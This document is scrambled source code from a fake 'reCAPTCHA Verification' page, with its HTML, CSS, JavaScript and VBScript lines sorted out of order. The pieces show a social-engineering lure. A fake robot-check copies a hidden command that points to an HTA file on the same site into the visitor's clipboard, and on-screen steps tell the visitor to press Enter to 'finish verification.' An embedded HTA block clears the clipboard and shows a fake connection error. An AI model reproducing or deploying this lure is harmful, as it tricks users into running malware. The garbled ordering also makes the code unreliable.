    
        
            
                   
                        
                            Press 
                            Press <b>Enter</b> on your keyboard to finish.
                        </li>
                        <br>
                        <li>
                        You will observe and agree:
                        closeverifywindow()
                    </code>
                    </ol>
                    </p>
                    <code>
                    <ol>
                    <p>
                    Perform the steps above to finish verification.
                    checkboxBtn.disabled = true
                    event.preventDefault()
                    if (!path.includes(verifywindow) 
                    let path = event.composedPath()
                    runClickedCheckboxEffects()
                    }
                </div>
                </header>
                </main>
                showCaptchaLoading()
                showVerifyWindow()
                transform: rotate(0deg)
                transform: rotate(360deg)
                })
               verifywindow.style.left =  checkboxWindow.offsetLeft - 8  
            0% {
            100% {
            </div>
            </footer>
            </p>
            <br>
            align-items: center
            animation: spin 1s linear infinite
            background-color: 
            border-radius: 2px
            border-radius: 3px
            border-radius: 50%
            border-top: 1px solid 
            border-top: 2px solid 
            border: 1px solid 
            border: 2px solid 
            border: none
            bottom: 36px
            bottom: 3px
            bottom: 40px
            box-sizing: border-box
            checkboxBtn.disabled = false
            color: 
            color: gray
            color: red
            const htaPath = window.location.origin 
            const max = 9999
            const min = 1000
            const textToCopy = commandToRun 
            counter-increment: item
            counter-reset: item
            cursor: not-allowed
            display: block
            display: flex
            display: grid
            document.body.append(tempTextArea)
            document.body.removeChild(tempTextArea)
            document.getElementById('verification-id').textContent = verification_id
            flex-direction: column
            font-size: 13px
            font-size: 14px
            font-size: 15px
            font-size: 16px
            font-size: 24px
            font-size: 8px
            font-size: 9px
            font-size: small
            font-weight: 600
            font-weight: 700
            font-weight: bold
            grid-template-columns: auto 102px
            height: 100%
            height: 20px
            height: 28px
            height: 45px
            height: 74px
            height: min-content
            hideCaptchaCheckbox()
            hideCaptchaLoading()
            if (checkboxBtn) {
            if (verifywindow.offsetLeft 
            if (verifywindow.offsetTop < 5) {
            justify-content: center
            left: 112px
            left: 12px
            left: 244px
            left: 52px
            line-height: normal
            list-style-position: outside
            list-style-type: none
            margin-bottom: 10px
            margin-bottom: 20px
            margin-left: 10px
            margin-left: 2px
            margin-right: 10px
            margin: 0
            margin: 21px 0 0 12px
            margin: auto
            opacity: 0
            outline: none
            padding-bottom: 4px
            padding-left: 0
            padding: 0
            padding: 10px 7px 10px 7px
            padding: 12px 0 12px 0
            padding: 16px 16px 24px 16px
            padding: 20px
            padding: 5px
            padding: 8px
            position: absolute
            position: relative
            return Math.floor(Math.random() 
            setClipboardCopyData(textToCopy)
            setTimeout(function() {
            setTimeout(function(){
            showCaptchaCheckbox()
            tempTextArea.select()
            tempTextArea.value = textToCopy
            text-align: center
            text-decoration: none
            text-decoration: underline
            text-transform: uppercase
            top: -85px
            transition: opacity 0.5s linear
            transition: opacity 400ms
            var verification_id = generateRandomNumber()
            verifywindow.style.left =  checkboxWindow.offsetLeft 
            verifywindow.style.top = checkboxWindow.offsetTop - 80 
            vertical-align: baseline
            visibility: hidden
            width: 100%
            width: 200px
            width: 20px
            width: 28px
            width: 300px
            width: 310px
            width: 40px
            }
        .block {
        .captcha-logo {
        .checkbox {
        .checkbox-container {
        .checkbox-desc {
        .checkbox-window a {
        .checkbox-window a:hover {
        .checkbox-window {
        .checkbox:hover {
        .container {
        .im-not-a-robot {
        .line-normal {
        .m-p {
        .spinner {
        .terms a {
        .terms a:hover {
        .terms {
        .verify-container {
        .verify-footer {
        .verify-footer-left {
        .verify-header {
        .verify-header-text-big {
        .verify-header-text-medium {
        .verify-header-text-small {
        .verify-main {
        .verify-verify-button {
        .verify-window {
        </div>
        </div>        
        </script>
        </style>
        <p><b>Failed to connect with the reCAPTCHA server.</b><br>Try the verification steps again.</p>
        <style>
        <title>reCAPTCHA Verification</title>
        @keyframes spin {
        Call HideConnectingShowError
        ClearClipboard
        Dim objHTML
        Set objHTML = Nothing
        addCaptchaListeners()
        body {
        code {
        function addCaptchaListeners() {
        function closeverifywindow() {
        function hideCaptchaCheckbox() {
        function hideCaptchaLoading() {
        function isverifywindowVisible() {
        function runClickedCheckboxEffects() {
        function setClipboardCopyData(textToCopy){
        function showCaptchaCheckbox() {
        function showCaptchaLoading() {
        function showVerifyWindow() {
        img {
        ol li {
        ol li::before {
        ol {
        }
       function generateRandomNumber() {
    />
    </body>
    </div>
    </head>
    </p>
    </script>
    </style>
    <HTA:APPLICATION
    <body>
    <head>
    <script>
    <style>
    <title>reCAPTCHA Verification</title>
    End Sub
    Sub ClearClipboard
    Sub HideConnectingShowError
    Sub Window_onLoad
